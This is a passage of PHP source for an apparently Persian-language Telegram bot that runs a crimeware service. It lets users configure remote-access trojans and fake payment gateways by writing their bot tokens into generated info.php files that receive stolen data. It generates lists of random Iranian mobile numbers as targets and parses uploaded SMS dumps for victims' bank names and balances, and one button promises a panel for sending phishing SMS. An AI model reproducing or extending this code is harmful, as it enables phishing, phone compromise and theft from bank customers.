  ##-------------------------##
elseif($query == "member_list"){
     $allm = file_get_contents("users.txt");
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
            لیست اعضای ربات
            -----------------
            $allm
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"<<--",'callback_data'=>"back_admin"]]
                    ]
                ])
            ]);   
}
/*
elseif($query == "ehraz_d"){
    file_put_contents("data/$admin/step.txt","ehraz_1");
    bot('editMessageText',[
        'chat_id'=>$query_id,
        'message_id'=>$query_messageid,
        'text'=>"
آیدی عددی کاربر مورد نظر را بفرستید
        ",
        'parse_mode'=>"HTML",
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"<<--",'callback_data'=>"back_admin"]]
                ]
            ])
        ]);
}
*/
##----------------------------------------##
      elseif($query == "ban"){
        file_put_contents("data/$admin/step.txt","ban1");
               bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
آیدی عددی کاربر مورد نظر را بفرستید

مانند نمونه : 1234567890
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"<<--",'callback_data'=>"back_admin"]]
                    ]
                ])
            ]);   
      }
      elseif(file_get_contents("data/$admin/step.txt")=="ban1"){
        if(is_dir("data/$text")){
          file_put_contents("data/$text/status","ban");
           file_put_contents("data/$admin/step.txt","none");
del("data/$text");
          sendmessage($chat_id,"کاربر $text با موفقیت از ربات بن شد","html",$message_id,json_encode([
                'inline_keyboard' => [
                	[
                        ['text'=>"بازگشت","callback_data"=>"back_admin"]],]
]));
sendmessage($text,"شما به دلایل امنیتی از ربات بن شدید ❌","HTML",$asl);
        }else{
            sendmessage($chat_id,"آیدی عددی کاربر یافت نشد","html",$message_id,json_encode([
                'inline_keyboard' => [
                	[
                        ['text'=>"بازگشت","callback_data"=>"back_admin"]],]
]));
        }
      }
       ##----------------------------##
       elseif($query == "unban"){
        file_put_contents("data/$admin/step.txt","unban1");
        bot('editMessageText',[ 
     'chat_id'=>$query_id, 
     'message_id'=>$query_messageid,
     'text'=>"
آیدی عددی کاربر مورد نظر را بفرستید

مانند نمونه : 1234567890
     ",
     'parse_mode'=>"html",
     'reply_markup'=>json_encode([
         'inline_keyboard'=>[
             [['text'=>"<<--",'callback_data'=>"back_admin"]]
             ]
         ])
     ]);   
}
elseif(file_get_contents("data/$admin/step.txt")=="unban1"){
 if(is_dir("data/$text")){
   file_put_contents("data/$text/status","unban");
    file_put_contents("data/$admin/step.txt","none");
   sendmessage($chat_id,"دسترسی کاربر $text با موفقیت به ربات فراهم شد","html",$message_id,json_encode([
                'inline_keyboard' => [
                	[
                        ['text'=>"بازگشت","callback_data"=>"back_admin"]],]
]));
 }else{
     sendmessage($chat_id,"آیدی عددی کاربر یافت نشد","html",$message_id,json_encode([
                'inline_keyboard' => [
                	[
                        ['text'=>"بازگشت","callback_data"=>"back_admin"]],]
]));
 }
       }
       ##----------------------------##
       elseif($query == "member"){
        $allm = file_get_contents("users.txt");
        $member_id = explode("\n",$allm);
        $mmemcount = count($member_id) -1;

        bot('answerCallbackQuery',[
   
            'callback_query_id'=>$callback_queryid,
                'text'=>"تعداد کل اعضای ربات » $mmemcount",
                'show_alert'=>true
             ]);
       }
        ##----------------------------##
        elseif($query == "off"){
            file_put_contents("status.txt","off");
            bot('answerCallbackQuery',[
   
                'callback_query_id'=>$callback_queryid,
                    'text'=>"ربات با موفقیت خاموش شد",
                    'show_alert'=>true
                 ]);
        }
        elseif($query == "on"){
            file_put_contents("status.txt","on");
            bot('answerCallbackQuery',[
   
                'callback_query_id'=>$callback_queryid,
                    'text'=>"ربات با موفقیت روشن شد",
                    'show_alert'=>true
                 ]);
        }
        ##----------------------------##
elseif($query == "hamegani"){
  file_put_contents("data/$admin/step.txt","h1");
        bot('editMessageText',[ 
     'chat_id'=>$query_id, 
     'message_id'=>$query_messageid,
     'text'=>"
     پیام خود را ارسال کنید
     ",
     'parse_mode'=>"html",
     'reply_markup'=>json_encode([
         'inline_keyboard'=>[
             [['text'=>"<<--",'callback_data'=>"back_admin"]]
             ]
         ])
     ]);   
}elseif(file_get_contents("data/$admin/step.txt")=="h1"){
      file_put_contents("data/$admin/step.txt","none");
  
        $fp = fopen("users.txt", 'r');
        while (!feof($fp)) {
        $userall = fgets($fp);
sendmessage($userall,$text,"html",$all_messageid);
        }
sendmessage($chat_id,"پیام شما به $member_count کاربر ارسال شد.","html",$message_id,json_encode([
                'inline_keyboard' => [
                	[
                        ['text'=>"بازگشت","callback_data"=>"back_admin"]],]
]));
  
  
}elseif($query == "back_admin"){
  file_put_contents("data/$admin/step.txt","none");
          bot('editMessageText',[ 
     'chat_id'=>$query_id, 
     'message_id'=>$query_messageid,
     'text'=>"
   به منوی اصلی خوش آمدید
     ",
     'parse_mode'=>"html",
     'reply_markup'=>$admin_panel
     ]); 
}
##--------##
elseif($query == "list_a"){
    $list = file_get_contents('users.txt');
    bot('editMessageText',[
        'chat_id'=>$query_id,
        'message_id'=>$query_messageid,
        'text'=>'
Result :{
    users_list:{
        '.$list.'
    }
}
        ',
        'parse_mode'=>"html",
        'replay_markup'=>json_encode([
            'inline_keyboard'=>[
[['text'=>"<<--",'callback_data'=>"back_admin"]]
                ]
            ])
        ]);
}

#---------------------------------#
elseif(strpos($query, 'confirm') !== false){
  $datass = explode(" ", $query);
  $c_id = $datass[1];
  file_put_contents("data/$c_id/ehraz.txt","true");
  file_put_contents("data/$query_id/ehraz2.txt","ok");
  
            bot('editMessageText',[ 
     'chat_id'=>$query_id, 
     'message_id'=>$query_messageid,
     'text'=>"
ربات برای کاربر $c_id با موفقیت فعال شد
     ",
     'parse_mode'=>"html",
     'reply_markup'=>json_encode([
         'inline_keyboard'=>[
       [['text'=>"<<--",'callback_data'=>"back_admin"]]
             ]
         ])
     ]); 
     bot('sendMessage',[
    'chat_id'=>$c_id,
    'text'=>"ربات هم اکنون برای شما فعال شد، ( /start ) را بزنید",
    'parse_mode'=>"html",
 ]);
}
#---------------------------------#
elseif(strpos($query, 'rej') !== false){
  $datass = explode(" ", $query);
  $c_id = $datass[1];
  file_put_contents("data/$c_id/ehraz.txt","false");
            bot('editMessageText',[ 
     'chat_id'=>$query_id, 
     'message_id'=>$query_messageid,
     'text'=>"
کاربر $c_id با موفقیت رد درخواست شد
     ",
     'parse_mode'=>"html",
     'reply_markup'=>json_encode([
         'inline_keyboard'=>[
       [['text'=>"<<--",'callback_data'=>"back_admin"]]
             ]
         ])
     ]); 
     bot('sendMessage',[
    'chat_id'=>$c_id,
    'text'=>"کاربر عزیز شما به دلایل امنیتی رد درخواست شدید، با پشتیبانی در ارتباط باشید",
    'parse_mode'=>"html",
 ]);
}
##-------------------------##
elseif($query == "change" and file_get_contents("status.txt")=="on"){
           bot('editMessageText',[ 
     'chat_id'=>$query_id, 
     'message_id'=>$query_messageid,
     'text'=>"
کدام نوع رو میخواهید تغییر آیدی عددی دهید ؟
     ",
     'parse_mode'=>"html",
     'reply_markup'=>json_encode([
         'inline_keyboard'=>[
           [['text'=>"رت | Rat",'callback_data'=>"c_rat"],['text'=>"درگاه | Gateway",'callback_data'=>"c_gateway"]],
       [['text'=>"<<--",'callback_data'=>"back"]]
             ]
         ])
     ]); 
}elseif($query == "c_gateway" and file_get_contents("status.txt")=="on"){
         file_put_contents("data/$query_id/step.txt","c_gateway1");
                  bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="c_gateway1"){
        if(file_exists("data/$chat_id/site/$text.json")){
file_put_contents("data/$chat_id/step.txt","c_gateway2");
                $json = json_decode(file_get_contents("data/$chat_id/site/$text.json"),true);
                $address = $json['url'];
    $code = $json['code'];
          include "data/$chat_id/payment/".$code."/info.php";
         
               
     sendmessage($chat_id,"اطلاعات درگاه فعلی شما به شرح زیر میباشد
     ----------------
     توکن : $text
     لینک شخصی : $address
     آیدی عددی تنظیم شده : $ID
     ----------------
      برای تغییر دادن آیدی عددی، آیدی عددی جدید را همینجا ارسال کنید یا به منوی اصلی بازگردید
      توجه کنید ! :
      در ارسال آیدی عددی دقت کنید، ربات به ارسال داده ها حساس میباشد، اگر کارکتر اضافه در ربات باشد مسدود خواهید شد
     ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],
           ]
           ]));
          file_put_contents("data/$chat_id/army.txt",$code);
          file_put_contents("data/$chat_id/army2.txt",$ID);
          file_put_contents("data/$chat_id/army3.txt",$ID_SHELL);
          file_put_contents("data/$chat_id/army4.txt",$TOKEN);
          file_put_contents("data/$chat_id/army5.txt",$TOKEN_SHELL);
        }else{
                file_put_contents("data/$chat_id/step.txt","none");
sendmessage($chat_id,"درگاهی با این توکن ساخته نشده !","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"change"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],
           ]
           ]));
        }
    }
    elseif(file_get_contents("data/$chat_id/step.txt")=="c_gateway2"){
        if(filter_var ( $text , FILTER_VALIDATE_INT )){

          $code = file_get_contents("data/$chat_id/army.txt");

          $id_shell22 = file_get_contents("data/$chat_id/army3.txt");

          $user_token = file_get_contents("data/$chat_id/army4.txt");
          $token_shell22 = file_get_contents("data/$chat_id/army5.txt");
rmdir("data/$chat_id/payment/$code/info.php");
            $FileName = "data/$chat_id/payment/$code/info.php";
            $FileHandle = fopen($FileName, 'w') or die("can't open file");
            
            $TOKEN = '$TOKEN';
            $ID = '$ID';
            $id = '$ID_SHELL';
            $token = '$TOKEN_SHELL';

            fwrite($FileHandle, "
            <?php
            $TOKEN = '$user_token';
            $ID = '$text';
            $id = '$id_shell22';
            $token = '$token_shell22';
            ?>
            ");
          sendmessage($chat_id,"آیدی عددی ($text) با موفقیت تنظیم شد","html",$message_id,json_encode([
            'inline_keyboard'=>[
              [['text'=>"<<--",'callback_data'=>"back"]]
            ]
            
          ]));
        }else{
          file_put_contents("data/$chat_id/status","ban");
          sendmessage($chat_id,"به دلیل استفاده از کد مخرب از ربات مسدود شدید","html",$message_id,json_encode([
            'inline_keyboard'=>[
              [['text'=>"پشتیبانی",'url'=>"https://t.me/$your_id"]]
            ]
            
          ]));
        }
    }
##----------------------------------------------##
elseif($query == "c_rat" and file_get_contents("status.txt")=="on"){
         file_put_contents("data/$query_id/step.txt","c_rat1");
                  bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="c_rat1"){
        if(file_exists("data/$chat_id/rat_list/$text.json")){
file_put_contents("data/$chat_id/step.txt","c_rat2");
                $json = json_decode(file_get_contents("data/$chat_id/rat_list/$text.json"),true);
                $address = $json['url'];
    $code = $json['code'];
          include "data/$chat_id/rat/".$code."/info.php";
         
               
     sendmessage($chat_id,"اطلاعات رت فعلی شما به شرح زیر میباشد
     ----------------
     توکن : $text
     لینک شخصی : $address
     آیدی عددی تنظیم شده : $id
     ----------------
      برای تغییر دادن آیدی عددی، آیدی عددی جدید را همینجا ارسال کنید یا به منوی اصلی بازگردید
      توجه کنید ! :
      در ارسال آیدی عددی دقت کنید، ربات به ارسال داده ها حساس میباشد، اگر کارکتر اضافه در ربات باشد مسدود خواهید شد
     ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],
           ]
           ]));
          file_put_contents("data/$chat_id/army.txt",$code);
          file_put_contents("data/$chat_id/army2.txt",$id);
          file_put_contents("data/$chat_id/army3.txt",$token);
          file_put_contents("data/$chat_id/army4.txt",$TOKEN_ADMIN);
          file_put_contents("data/$chat_id/army5.txt",$ID_ADMIN);
          file_put_contents("data/$chat_id/army6.txt",$apikey);
          file_put_contents("data/$chat_id/army7.txt",$id_tel);
        }else{
                file_put_contents("data/$chat_id/step.txt","none");
sendmessage($chat_id,"رتی با این توکن ساخته نشده !","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"change"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],
           ]
           ]));
        }
    }
    elseif(file_get_contents("data/$chat_id/step.txt")=="c_rat2"){
        if(filter_var ( $text , FILTER_VALIDATE_INT )){

          $code = file_get_contents("data/$chat_id/army.txt");

          $token111 = file_get_contents("data/$chat_id/army3.txt");

          $token_sh = file_get_contents("data/$chat_id/army4.txt");
          
          $id_sh = file_get_contents("data/$chat_id/army5.txt");
          
          $api_key = file_get_contents("data/$chat_id/army6.txt");
          
          
rmdir("data/$chat_id/payment/$code/info.php");
            $FileName = "data/$chat_id/rat/$code/info.php";
            $FileHandle = fopen($FileName, 'w') or die("can't open file");
            
            $token = '$token';
            $id = '$id';
            $TOKEN_ADMIN = '$TOKEN_ADMIN';
            $apikey = '$apikey';
          $ID_ADMIN = '$ID_ADMIN';
$id_tel = '$id_tel';
          $admin_list = '$admin_list';
    
            fwrite($FileHandle, "
<?php
$token = '$token111';
$id = '$text';
$TOKEN_ADMIN = '$token_sh';
$ID_ADMIN = '$id_sh';
$apikey = '$api_key';
$id_tel = '$your_id';
$admin_list = [$text];
?>

            ");
          sendmessage($chat_id,"آیدی عددی ($text) با موفقیت تنظیم شد","html",$message_id,json_encode([
            'inline_keyboard'=>[
              [['text'=>"<<--",'callback_data'=>"back"]]
            ]
            
          ]));
        }else{
          file_put_contents("data/$chat_id/status","ban");
          sendmessage($chat_id,"به دلیل استفاده از کد مخرب از ربات مسدود شدید","html",$message_id,json_encode([
            'inline_keyboard'=>[
              [['text'=>"پشتیبانی",'url'=>"https://t.me/$your_id"]]
            ]
            
          ]));
        }
    }
#-------------------##
elseif($query == "panel_s"){
   bot('answerCallbackQuery',[
   
'callback_query_id'=>$callback_queryid,
    'text'=>"بزودی پنل اس ام اس با قابلیت ارسال پیامک های فیشینگ فراهم میشود...",
    'show_alert'=>true
 ]);
}
##-------------------##
elseif($query == "buy_charge" and file_get_contents("status.txt")=="on"){
   bot('answerCallbackQuery',[
   
'callback_query_id'=>$callback_queryid,
    'text'=>"بزودی ...",
    'show_alert'=>true
 ]);
}
##--------------------##
elseif($query == "pro" and file_get_contents("status.txt")=="on"){
    file_put_contents("data/$query_id/step.txt","luci");
    
     bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"رنج خود را مانند نمونه ارسال کنید
نمونه : 0912",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"بازگشت",'callback_data'=>"back"]]
            ]
        ])
 ]);
}
elseif(file_get_contents("data/$chat_id/step.txt")=="luci"){
    file_put_contents("data/$chat_id/range.txt",$text);
    file_put_contents("data/$chat_id/step.txt","luci2");
    if(strlen($text)=="4"){
     bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=>"3 رقم وسط از چه عددی شروع شود ؟

نمونه : 111",
    'parse_mode'=>"html",
    'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"بازگشت",'callback_data'=>"back"]]
            ]
        ]) ]);
}else{
       bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=>"رنج خود را صحیح ارسال کنید
نمونه : 0912",
    'parse_mode'=>"html",
    'reply_to_message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"بازگشت",'callback_data'=>"back"]]
            ]
        ]) ]);
}
}
elseif(file_get_contents("data/$chat_id/step.txt")=="luci2"){
    if(strlen($text)=="3"){
    file_put_contents("data/$chat_id/center-start.txt",$text);
    file_put_contents("data/$chat_id/step.txt","luci3");
         bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=>"3 رقم وسط از چه عددی تمام شود ؟

نمونه : 999",
    'parse_mode'=>"html",
    'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"بازگشت",'callback_data'=>"back"]]
            ]
        ]) ]);
}else{
          bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=>"لطفا 3 رقم را صحیح ارسال کنید
نمونه: 111",
    'parse_mode'=>"html",
    'reply_to_message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"بازگشت",'callback_data'=>"back"]]
            ]
        ])
 ]);  
}
}
elseif(file_get_contents("data/$chat_id/step.txt")=="luci3"){
        file_put_contents("data/$chat_id/center-end.txt",$text);
        
$range = file_get_contents("data/$chat_id/range.txt");
$c1 = file_get_contents("data/$chat_id/center-start.txt");
$c2 = file_get_contents("data/$chat_id/center-end.txt");

    $arr = array(
'number' => array(
01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
),
);

$for = 20;


for($i = 0; $i < $for; $i++){

       $num = $range;
       $num .= rand($c1,$c2);
       $num .= rand(1011,9990);

       if(strlen($num) == 12) continue;
       $number .= $num."\n";
}
          bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=>"شماره های شما با موفقیت ساخته شد ✅
    
<code>$number</code>

$team_name
    ",
    'parse_mode'=>"html",
    'reply_to_message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"بازگشت",'callback_data'=>"back"]]
            ]
        ])
 ]);  
 file_put_contents("data/$chat_id/step.txt","none");
}
##-----------------##
elseif($query == "random" and file_get_contents("status.txt")=="on"){
     bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"درحال پردازش اطلاعات ...",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"بازگشت",'callback_data'=>"back"]]
            ]
        ])
 ]);
 
    for($i=0; $i<=20; $i++){
$array = ['0912','0917','0937','0921','0914'];
$rand = array_rand($array,5);
$luci = rand(0,4);
$range =  $array[$rand[$luci]];

   $num1 = rand(101,990);
   $num2 = rand(1011,9990);

$result .= "$range$num1$num2"."\n";
}
     bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"شماره های شما با موفقیت ساخته شد✅

<code>$result</code>",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"بازگشت",'callback_data'=>"back"]]
            ]
        ])
 ]);
}
##-----------------##
elseif($query== "rand" and file_get_contents("status.txt")=="on"){

    bot('editMessageText',[ 
        'chat_id'=>$query_id, 
        'message_id'=>$query_messageid,
        'text'=>'
یک رنج را از لیست زیر انتخاب کنید
        ',
        'parse_mode'=>"html",
        'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"0912",'callback_data'=>"0912"],['text'=>"0917",'callback_data'=>"0917"]],
                [['text'=>"0916",'callback_data'=>"0916"],['text'=>"0915",'callback_data'=>"0915"]],
                [['text'=>"0922",'callback_data'=>"0922"],['text'=>"0937",'callback_data'=>"0937"]],
                [['text'=>"0930",'callback_data'=>"0930"],['text'=>"0919",'callback_data'=>"0919"]],
                [['text'=>"0921",'callback_data'=>"0921"],['text'=>"0914",'callback_data'=>"0914"]],
                [['text'=>"بازگشت",'callback_data'=>"back"]]
                ]
            ])
        ]);   
}
elseif($query == "0912" and file_get_contents("status.txt")=="on"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0912';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"بازگشت | Back",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0917" and file_get_contents("status.txt")=="on"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0917';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"بازگشت | Back",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0916" and file_get_contents("status.txt")=="on"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0916';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"بازگشت | Back",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0915" and file_get_contents("status.txt")=="on"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0915';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"بازگشت | Back",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0922" and file_get_contents("status.txt")=="on"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0922';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"بازگشت | Back",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0937" and file_get_contents("status.txt")=="on"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0937';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"بازگشت | Back",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0930" and file_get_contents("status.txt")=="on"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0930';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"بازگشت | Back",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0919" and file_get_contents("status.txt")=="on" ){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0919';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"بازگشت | Back",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0921" and file_get_contents("status.txt")=="on"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0921';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"بازگشت | Back",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
elseif($query == "0914"and file_get_contents("status.txt")=="on"){
    $arr = array(
        'number' => array(
        01,02,03,05,10,11,12,13,14,15,16,17,18,19,20,21,22,30,33,35,36,37,38,39
        ),
        );
        
        $for = 20;
        
        for($i = 0; $i < $for; $i++)
        {
        
               $num = '0914';
               $num .= rand(101,990);
               $num .= rand(1011,9990);
        
               if(strlen($num) == 12) continue;
               $number .= $num."\n";
        }
        bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
شماره های شما با موفقیت ساخته شد ✅
➖➖➖➖➖➖
<code>$number</code>
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"بازگشت | Back",'callback_data'=>"back"]]
                    ]
                ])
            ]);   
}
##-------------##
elseif($query == "sms"and file_get_contents("status.txt")=="on"){
    file_put_contents("data/$query_id/step.txt","sms_1");
            bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
فایل .txt خود را ارسال کنید 📝

توجه کنید فقط فایل SMS وبا فرمت .txt ارسال کنید ✉️
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"بازگشت | Back",'callback_data'=>"back"]]
                    ]
                ])
            ]);  
}
elseif(file_get_contents("data/$chat_id/step.txt")=="sms_1" and $document){
    if(strpos($file,".txt")!==false){
        
    $get = bot('getfile',['file_id'=>$file_id]);
    $patch = $get->result->file_path;
    $aaa = file_get_contents('https://api.telegram.org/file/bot'.$token.'/'.$patch);
    
    if(strstr($aaa,"مانده") and strstr($aaa,"بانک")){
$a = strstr($aaa,"مانده");
$b = preg_match_all('#بانک (.*?)
(.*?)#',$aaa,$bank);
$bank2 = $bank[1][0];

preg_match_all('#مانده:(.*?)
(.*?)#',$a,$b);

$balance = $b[1][0];
$result = "
پیام بانکی یافت شد ✅

🏦 بانک » $bank2
💰 موجودی » $balance ریال
❗️ این پیام مربوط به آخرین تراکنش میباشد
";
}else{
    $result = "
پیام بانکی در فایل مورد نظر یافت نشد ❌

$team_name
    ";
}
sendmessage($chat_id,$result,"html",$message_id,json_encode([
    'inline_keyboard'=>[
        [['text'=>"بازگشت",'callback_data'=>"back"]]
        ]
    ]));

    }else{
        sendmessage($chat_id,"فایل ارسالی باید با فرمت .txt باشد","html",$message_id,false); 
    }
##---------------------##
}
elseif($query == "contact"and file_get_contents("status.txt")=="on"){
